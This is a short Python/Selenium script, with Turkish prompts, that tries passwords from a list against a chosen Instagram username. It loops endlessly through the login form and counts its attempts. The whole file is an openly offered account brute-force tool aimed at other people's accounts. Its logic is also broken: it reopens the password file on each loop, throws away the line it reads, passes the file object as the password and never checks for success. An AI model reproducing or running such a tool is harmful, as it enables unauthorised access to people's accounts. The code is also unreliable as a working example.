from selenium import webdriver
import os
import time
def banner():
    print("""


    .::Creacted By 4XROİX::.
       VERSION : 0.1
       CODE    : PYTHON,SELENIUM


    """)
banner()
tarayici = webdriver.Chrome()
os.system("clear")
hedefkul = input("HEDEF KULLANICI ADI :")
os.system("clear")
sifreler = input("SIFRE LISTESI KONUMU : ")
os.system("clear")
print("HEDEF : "+hedefkul+" SIFRE LISTESI KONUMU : "+sifreler+" LUTFEN 5 SANIYE BEKLEYINIZ")
time.sleep(5)
tarayici.get("https://www.instagram.com/")
deneme = 0
while True:
    oku = open(sifreler, "r")
    oku.readline()
    tarayici.find_element_by_name("username").send_keys(hedefkul)
    tarayici.find_element_by_name("password").send_keys(oku)
    time.sleep(2)
    tarayici.find_element_by_class_name("sqdOP  L3NKy   y3zKF     ").click()
    deneme+=1
    print("HEDEF : "+hedefkul+" DENEME : "+str(deneme))
    time.sleep(3)



